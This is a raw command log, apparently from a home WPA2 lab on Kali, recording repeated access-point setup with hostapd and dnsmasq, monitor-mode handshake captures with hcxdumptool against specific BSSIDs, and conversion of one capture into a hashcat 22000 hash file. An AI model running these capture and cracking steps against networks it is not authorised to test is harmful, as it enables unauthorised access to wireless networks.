+2025-05-04 20:37:43,848 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:37:43,866 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:37:43,927 INFO CMD sudo hostapd -B /tmp/tmpxieea720
+2025-05-04 20:37:44,020 INFO CMD sudo dnsmasq -C /tmp/tmpihiilo79
+2025-05-04 20:37:54,628 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:37:54,648 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -oP /home/kali/wpa2lab/captures/dump-20250504_203754.pcapng
+2025-05-04 20:40:03,484 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:40:03,638 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -oP /home/kali/wpa2lab/captures/dump-20250504_204003.pcapng
+2025-05-04 20:40:36,765 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:40:39,402 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:40:39,660 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:40:43,019 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:40:43,040 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:40:43,059 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:40:43,116 INFO CMD sudo hostapd -B /tmp/tmpxwlsqel5
+2025-05-04 20:40:43,224 INFO CMD sudo dnsmasq -C /tmp/tmp7q_2z3rp
+2025-05-04 20:40:50,266 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:40:50,426 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 --outfile /home/kali/wpa2lab/captures/dump-20250504_204050.pcapng
+2025-05-04 20:42:27,976 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:42:30,316 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:42:30,588 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:42:33,652 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:42:33,670 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:42:33,687 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:42:33,745 INFO CMD sudo hostapd -B /tmp/tmp3hnnjx3p
+2025-05-04 20:42:33,851 INFO CMD sudo dnsmasq -C /tmp/tmpkq4tgng0
+2025-05-04 20:42:44,786 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:42:44,932 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_204244.pcapng
+2025-05-04 20:42:54,492 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250504_204254.22000 /home/kali/wpa2lab/captures/dump-20250504_204244.pcapng
+2025-05-04 20:42:57,189 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:42:57,210 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_204257.pcapng
+2025-05-04 20:45:51,688 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:45:56,984 INFO CMD sudo ip link set wlan1 up
+2025-05-04 20:45:57,132 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 20:45:57,148 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 20:45:57,855 INFO CMD sudo hostapd -B /tmp/tmpp4rx639t
+2025-05-04 20:45:58,308 INFO CMD sudo dnsmasq -C /tmp/tmpav4hawf0
+2025-05-04 20:46:03,137 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:46:03,379 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 20:46:24,390 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 20:46:26,735 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:46:26,954 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:46:29,624 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:46:29,832 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:46:29,851 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:46:29,906 INFO CMD sudo hostapd -B /tmp/tmp9h3bx7qc
+2025-05-04 20:46:30,231 INFO CMD sudo dnsmasq -C /tmp/tmp0q0bhocu
+2025-05-04 20:46:46,272 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:46:46,474 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_204646.pcapng
+2025-05-04 20:48:16,946 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:48:26,142 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:48:26,398 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:48:29,572 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:48:29,591 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:48:29,609 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:48:29,667 INFO CMD sudo hostapd -B /tmp/tmps0fgwiqy
+2025-05-04 20:48:29,760 INFO CMD sudo dnsmasq -C /tmp/tmpgzw3mqsw
+2025-05-04 20:48:51,067 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:48:51,224 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_204851.pcapng
+2025-05-04 20:51:44,063 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:51:46,167 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:51:46,421 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:51:49,682 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:51:49,700 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:51:49,717 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:51:49,772 INFO CMD sudo hostapd -B /tmp/tmpq9vgjugr
+2025-05-04 20:51:49,849 INFO CMD sudo dnsmasq -C /tmp/tmpa4kzao2s
+2025-05-04 20:52:00,839 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:52:00,993 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -o /home/kali/wpa2lab/captures/dump-20250504_205200.pcapng
+2025-05-04 20:53:40,738 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:53:45,062 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:53:45,328 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:53:48,691 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:53:48,709 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:53:48,725 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:53:48,776 INFO CMD sudo hostapd -B /tmp/tmpr87jvo58
+2025-05-04 20:53:48,870 INFO CMD sudo dnsmasq -C /tmp/tmpjr8k101l
+2025-05-04 20:54:03,751 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:54:03,767 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_205403
+2025-05-04 20:55:10,770 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:55:12,927 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:55:13,984 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:55:17,201 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:55:17,219 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:55:17,237 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:55:17,298 INFO CMD sudo hostapd -B /tmp/tmpzipjwj6b
+2025-05-04 20:55:17,615 INFO CMD sudo dnsmasq -C /tmp/tmpuoirzk4i
+2025-05-04 20:55:29,366 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:55:29,611 INFO CMD sudo ip link set wlan1mon down
+2025-05-04 20:55:30,341 INFO CMD sudo ip link set wlan1mon up
+2025-05-04 20:55:30,539 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:55:30,692 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_205530
+2025-05-04 20:56:37,823 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:56:40,315 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:56:41,199 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:56:43,981 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:56:44,001 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:56:44,018 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:56:44,079 INFO CMD sudo hostapd -B /tmp/tmpses5j4nh
+2025-05-04 20:56:44,392 INFO CMD sudo dnsmasq -C /tmp/tmpwwz8kfc2
+2025-05-04 20:56:52,945 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:56:53,163 INFO CMD sudo ip link set wlan1mon down
+2025-05-04 20:56:53,241 INFO CMD sudo ip link set wlan1mon up
+2025-05-04 20:56:53,439 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:56:53,582 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_205653
+2025-05-04 21:00:12,245 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 21:00:14,661 INFO CMD sudo airmon-ng check kill
+2025-05-04 21:00:16,339 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 21:00:19,582 INFO CMD sudo ip link set wlan0 up
+2025-05-04 21:00:19,603 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 21:00:19,621 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 21:00:19,679 INFO CMD sudo hostapd -B /tmp/tmpz8xnkvbn
+2025-05-04 21:00:20,012 INFO CMD sudo dnsmasq -C /tmp/tmpj3n864n2
+2025-05-04 21:00:23,301 INFO CMD sudo iw dev wlan1mon set channel 
+2025-05-04 21:00:35,873 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 21:00:36,032 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250504_210036.pcapng
+2025-05-05 20:39:51,269 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:39:52,249 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:39:58,181 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:40:07,047 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:40:07,266 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:40:12,013 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:40:12,032 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:40:12,049 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:40:12,126 INFO CMD sudo hostapd -B /tmp/tmppduzymjy
+2025-05-05 20:40:12,728 INFO CMD sudo dnsmasq -C /tmp/tmp6wc5pouj
+2025-05-05 20:40:22,977 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:40:23,132 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:87 -w /home/kali/wpa2lab/captures/dump-20250505_204023.pcapng
+2025-05-05 20:42:52,854 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:42:53,107 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 20:42:56,148 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:42:57,377 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 20:42:59,633 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:42:59,857 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:43:02,383 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:43:02,591 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:43:02,609 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:43:02,665 INFO CMD sudo hostapd -B /tmp/tmpphjdy1yo
+2025-05-05 20:43:02,961 INFO CMD sudo dnsmasq -C /tmp/tmporhy4mdd
+2025-05-05 20:43:11,241 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:43:11,396 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_204311.pcapng
+2025-05-05 20:44:49,855 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:44:52,116 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:44:52,359 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:44:55,703 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:44:55,721 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:44:55,738 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:44:55,791 INFO CMD sudo hostapd -B /tmp/tmpnhibq508
+2025-05-05 20:44:55,895 INFO CMD sudo dnsmasq -C /tmp/tmp0o3i_uaq
+2025-05-05 20:45:04,599 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:45:04,755 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_204504.pcapng
+2025-05-05 20:46:15,373 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:46:17,676 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:46:17,935 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:46:21,155 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:46:21,173 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:46:21,190 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:46:21,244 INFO CMD sudo hostapd -B /tmp/tmpm6esb9cl
+2025-05-05 20:46:21,343 INFO CMD sudo dnsmasq -C /tmp/tmpyjbbxx_c
+2025-05-05 20:46:27,741 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:46:27,897 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_204627.pcapng
+2025-05-05 20:47:26,172 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:47:31,261 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:47:31,525 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:47:35,025 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:47:35,044 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:47:35,062 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:47:35,119 INFO CMD sudo hostapd -B /tmp/tmp6cftpb70
+2025-05-05 20:47:35,191 INFO CMD sudo dnsmasq -C /tmp/tmp4_yao1x5
+2025-05-05 20:47:41,517 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:47:41,787 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:47:42,594 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_204742.pcapng
+2025-05-05 20:47:53,800 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:47:56,479 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:47:56,639 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:48:06,399 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:48:06,622 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:48:06,779 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_204806.pcapng
+2025-05-05 20:56:05,314 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:56:09,050 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:56:09,284 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:56:16,825 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:56:18,279 INFO CMD sudo iw dev wlan1mon set channel 11
+2025-05-05 20:56:18,436 INFO CMD sudo hcxdumptool -i wlan1mon -c 11 -t CC:ED:DC:A5:E1:E6 -w /home/kali/wpa2lab/captures/dump-20250505_205618.pcapng
+2025-05-05 20:56:37,663 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:56:37,680 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:56:37,697 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:56:37,753 INFO CMD sudo hostapd -B /tmp/tmpyu36061b
+2025-05-05 20:56:37,838 INFO CMD sudo dnsmasq -C /tmp/tmpfso8ijf8
+2025-05-05 20:56:45,069 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:56:49,630 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:56:49,788 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_205649.pcapng
+2025-05-05 20:58:49,837 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 20:58:52,719 INFO CMD sudo airmon-ng check kill
+2025-05-05 20:58:52,941 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 20:58:55,783 INFO CMD sudo ip link set wlan0 up
+2025-05-05 20:58:55,801 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 20:58:55,819 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 20:58:55,876 INFO CMD sudo hostapd -B /tmp/tmp510w2jbn
+2025-05-05 20:58:55,952 INFO CMD sudo dnsmasq -C /tmp/tmpehhwhrx8
+2025-05-05 20:59:03,235 INFO CMD sudo ip link set wlan0 down
+2025-05-05 20:59:03,309 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 20:59:03,381 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 20:59:03,579 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 20:59:03,734 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_205903.pcapng
+2025-05-05 21:02:26,307 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:02:29,032 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:02:29,262 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:02:31,865 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:02:32,074 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:02:32,091 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:02:32,150 INFO CMD sudo hostapd -B /tmp/tmpmcpzblqo
+2025-05-05 21:02:32,221 INFO CMD sudo dnsmasq -C /tmp/tmp8jbww2cq
+2025-05-05 21:02:40,173 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:02:40,266 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:02:40,463 INFO CMD sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/captures/dump-20250505_210240.pcapng
+2025-05-05 21:04:09,377 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:04:11,875 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:04:12,098 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:04:17,035 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:04:17,054 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:04:17,072 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:04:17,130 INFO CMD sudo hostapd -B /tmp/tmpl3t_pife
+2025-05-05 21:04:17,217 INFO CMD sudo dnsmasq -C /tmp/tmpmwf_pdmz
+2025-05-05 21:04:26,518 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:04:26,600 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:04:26,798 INFO CMD sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/captures/raw-20250505_210426.pcapng
+2025-05-05 21:06:57,630 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:07:01,327 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:07:01,554 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:07:04,469 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:07:04,487 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:07:04,505 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:07:04,562 INFO CMD sudo hostapd -B /tmp/tmp2oqqold9
+2025-05-05 21:07:04,651 INFO CMD sudo dnsmasq -C /tmp/tmppvg8admj
+2025-05-05 21:07:13,116 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:07:13,205 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:07:13,402 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:08:01,545 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:08:03,874 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:08:04,095 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:08:08,249 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:08:08,268 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:08:08,284 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:08:08,345 INFO CMD sudo hostapd -B /tmp/tmpnnxx5t2l
+2025-05-05 21:08:08,439 INFO CMD sudo dnsmasq -C /tmp/tmpa49ywet9
+2025-05-05 21:08:14,593 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:08:14,665 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:08:14,857 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:08:42,753 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:08:49,452 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:08:49,676 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 21:08:53,221 INFO CMD sudo ip link set wlan1 up
+2025-05-05 21:08:53,370 INFO CMD sudo ip addr flush dev wlan1
+2025-05-05 21:08:53,388 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-05 21:08:53,448 INFO CMD sudo hostapd -B /tmp/tmprsanged4
+2025-05-05 21:08:53,898 INFO CMD sudo dnsmasq -C /tmp/tmpzvsauukg
+2025-05-05 21:08:59,609 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:08:59,855 INFO CMD sudo ip link set wlan0mon down
+2025-05-05 21:08:59,921 INFO CMD sudo iw dev wlan0mon set type monitor
+2025-05-05 21:08:59,939 INFO CMD sudo ip link set wlan0mon up
+2025-05-05 21:09:00,147 INFO CMD sudo iw dev wlan0mon set channel 6
+2025-05-05 21:09:00,168 INFO CMD sudo hcxdumptool -i wlan0mon -c 6 -t C0:1C:30:43:17:66 -o /home/kali/wpa2lab/captures/dump-20250505_210900.pcapng
+2025-05-05 21:09:57,384 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 21:10:01,011 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:10:01,226 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:10:04,280 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:10:04,493 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:10:04,511 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:10:04,570 INFO CMD sudo hostapd -B /tmp/tmpod24wvid
+2025-05-05 21:10:04,887 INFO CMD sudo dnsmasq -C /tmp/tmpvdrwbv8v
+2025-05-05 21:10:22,124 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:10:22,369 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:10:23,077 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 21:10:23,096 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:10:23,288 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:10:23,441 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -P 5 --enable_status=3 -o /home/kali/wpa2lab/captures/dump-20250505_211023.pcapng
+2025-05-05 21:11:32,359 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:11:36,043 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:11:36,236 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 21:11:44,174 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 21:11:46,688 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:11:46,912 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:11:50,590 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:11:50,802 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:11:50,818 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:11:50,876 INFO CMD sudo hostapd -B /tmp/tmpxo_r2__y
+2025-05-05 21:11:51,216 INFO CMD sudo dnsmasq -C /tmp/tmp1lksfkeu
+2025-05-05 21:11:56,265 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:11:56,494 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:11:57,217 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 21:11:57,233 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:11:57,423 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:11:57,579 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 --enable_status=3 -o /home/kali/wpa2lab/captures/dump-20250505_211157.pcapng
+2025-05-05 21:16:09,983 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:16:13,203 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:16:13,429 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:16:16,059 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:16:16,078 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:16:16,097 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:16:16,156 INFO CMD sudo hostapd -B /tmp/tmp5nj6_e1j
+2025-05-05 21:16:16,261 INFO CMD sudo dnsmasq -C /tmp/tmpwdzv_fyc
+2025-05-05 21:16:22,381 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:16:22,640 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:16:23,343 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 21:16:23,362 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:16:23,553 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:16:23,685 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -o /home/kali/wpa2lab/captures/dump-20250505_211623.pcapng --enable_status=3 --filterlist_ap=70:D8:23:2B:52:88 --filtermode=2
+2025-05-05 21:17:23,445 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:17:30,897 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:17:31,116 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 21:17:35,410 INFO CMD sudo ip link set wlan1 up
+2025-05-05 21:17:35,562 INFO CMD sudo ip addr flush dev wlan1
+2025-05-05 21:17:35,580 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-05 21:17:35,635 INFO CMD sudo hostapd -B /tmp/tmp1gvn_uo7
+2025-05-05 21:17:36,093 INFO CMD sudo dnsmasq -C /tmp/tmp1zml1jqv
+2025-05-05 21:17:52,019 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:17:52,277 INFO CMD sudo ip link set wlan0mon down
+2025-05-05 21:17:52,348 INFO CMD sudo iw dev wlan0mon set type monitor
+2025-05-05 21:17:52,364 INFO CMD sudo ip link set wlan0mon up
+2025-05-05 21:17:52,573 INFO CMD sudo iw dev wlan0mon set channel 6
+2025-05-05 21:17:52,594 INFO CMD sudo hcxdumptool -i wlan0mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_211752.pcapng --enable_status=3 --filterlist_ap=C0:1C:30:43:17:66 --filtermode=2
+2025-05-05 21:18:50,228 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 21:18:52,582 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:18:52,812 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:18:55,304 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:18:55,513 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:18:55,534 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:18:55,595 INFO CMD sudo hostapd -B /tmp/tmpzovv997z
+2025-05-05 21:18:55,901 INFO CMD sudo dnsmasq -C /tmp/tmpor24e3a2
+2025-05-05 21:19:13,247 INFO CMD sudo ip link set wlan1mon down
